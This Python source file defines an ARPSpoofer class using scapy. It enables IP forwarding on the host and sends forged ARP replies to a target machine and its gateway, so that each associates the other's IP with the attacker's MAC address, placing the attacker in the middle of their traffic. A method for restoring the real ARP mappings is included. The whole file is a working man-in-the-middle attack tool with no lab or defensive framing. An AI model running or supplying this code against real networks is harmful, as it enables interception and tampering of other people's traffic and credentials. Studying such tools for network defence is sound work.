from scapy.all import Ether, ARP, srp, send
import time

class ARPSpoofer:
    """
    A class to perform ARP Spoofing.

    Attributes:
        verbose (bool): Determines whether to print status messages.
    """

    def __init__(self, verbose=True):
        """
        Initializes the ARPSpoofer.

        Args:
            verbose (bool): Whether to print status messages (default is True).
        """
        self.verbose = verbose
        self._enable_ip_forwarding()

    def spoof(self, target_ip, gateway_ip):
        """
        Performs bidirectional ARP spoofing: making the target think we are the gateway,
        and making the gateway think we are the target.

        Args:
            target_ip (str): IP address of the target machine.
            gateway_ip (str): IP address of the gateway.
        """
        self._spoof(target_ip, gateway_ip)
        self._spoof(gateway_ip, target_ip)

    def restore(self, target_ip, gateway_ip):
        """
        Restores ARP tables for both target and gateway, undoing the spoofing.

        Args:
            target_ip (str): IP address of the target machine.
            gateway_ip (str): IP address of the gateway.
        """
        self._restore(target_ip, gateway_ip)
        self._restore(gateway_ip, target_ip)

    def _enable_ip_forwarding(self):
        """
        Enables IP forwarding on the system.
        """
        if self.verbose:
            print("Enabling IP forwarding...")
        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
        with open(ip_forward_path) as f:
            if f.read() == '1':
                return
        with open(ip_forward_path, 'w') as f:
            print(1, file=f)
        if self.verbose:
            print("IP forwarding enabled.")

    def _get_mac(self, ip):
        """
        Gets the MAC address associated with a given IP address.

        Args:
            ip (str): IP address.

        Returns:
            str: MAC address corresponding to the IP.
        """
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
        else:
            raise Exception(f"Could not find MAC address for IP {ip}")

    def _spoof(self, target_ip, spoof_ip):
        """
        Sends ARP packets to spoof the network, making the target think
        the spoof_ip (gateway or host) is at our MAC address.

        Args:
            target_ip (str): IP address of the target machine.
            spoof_ip (str): IP address to impersonate (usually the gateway).
        """
        target_mac = self._get_mac(target_ip)
        spoofed_arp_response = ARP(
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            op='is-at'
        )
        send(spoofed_arp_response, verbose=0)
        if self.verbose:
            print(f"Sent ARP spoof to {target_ip}: {spoof_ip} is now at our MAC address.")

    def _restore(self, target_ip, real_ip):
        """
        Sends ARP packets to restore the correct mapping in the target's ARP table.

        Args:
            target_ip (str): IP address of the target machine.
            real_ip (str): The real IP address to restore (usually the gateway).
        """
        target_mac = self._get_mac(target_ip)
        real_mac = self._get_mac(real_ip)
        restore_arp_response = ARP(
            pdst=target_ip,
            hwdst=target_mac,
            psrc=real_ip,
            hwsrc=real_mac,
            op='is-at'
        )
        send(restore_arp_response, verbose=0, count=20)
        if self.verbose:
            print(f"Restored ARP table for {target_ip}: {real_ip} is at {real_mac}.")
